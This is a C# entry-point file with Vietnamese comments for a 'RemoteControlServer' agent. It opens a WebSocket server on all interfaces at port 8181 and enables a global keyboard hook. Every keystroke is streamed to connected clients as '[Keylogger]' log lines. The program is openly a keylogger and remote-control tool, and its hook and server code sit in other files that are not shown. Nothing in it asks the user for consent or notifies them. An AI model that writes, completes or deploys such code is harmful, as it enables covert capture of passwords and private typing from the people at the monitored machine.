using System;
using System.Text;
using System.Threading;
using System.Windows.Forms; // Cần file .csproj có UseWindowsForms mới dùng được cái này
using System.Runtime.InteropServices;

namespace RemoteControlServer
{
    class Program
    {
        [DllImport("shcore.dll")]
        private static extern int SetProcessDpiAwareness(int processDpiAwareness);
        private const int PROCESS_PER_MONITOR_DPI_AWARE = 2;

        [STAThread] // Bắt buộc để xử lý các tác vụ hệ thống
        static void Main(string[] args)
        {
            try {
                Application.SetHighDpiMode(HighDpiMode.PerMonitorV2);
            } catch { }

            try {
                SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
            } catch { }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            Console.OutputEncoding = Encoding.UTF8;
            Console.Title = "RCS Agent Core - Port 8181";

            // 1. Khởi chạy Server (WebSocket chạy ngầm, không chặn luồng chính)
            try 
            {
                // Gọi hàm Start bên file ServerCore.cs
                ServerCore.Start("ws://0.0.0.0:8181");
            }
            catch (Exception ex)
            {
                Console.WriteLine("❌ Lỗi khởi tạo Server: " + ex.Message);
                Console.WriteLine("Kiểm tra xem file ServerCore.cs đã đúng namespace chưa.");
                Console.ReadLine();
                return;
            }

            // 2. Kích hoạt Keylogger
            // Hook vào luồng chính, nơi Application.Run sẽ chạy bên dưới
            KeyLoggerService.StartHook((key) => {
                // Callback: Khi có phím ấn -> Gửi log về Client
                ServerCore.BroadcastLog($"[Keylogger] {key}");
            });
            
            Console.WriteLine("[System] Keylogger Service: Active");
            Console.WriteLine(">> Server đang chạy... Nhấn Ctrl+C để thoát.");

            // 3. Giữ ứng dụng luôn chạy (Message Loop)
            // Lệnh này giúp Keylogger hoạt động và Server không bị tắt
            Application.Run();
        }
    }
}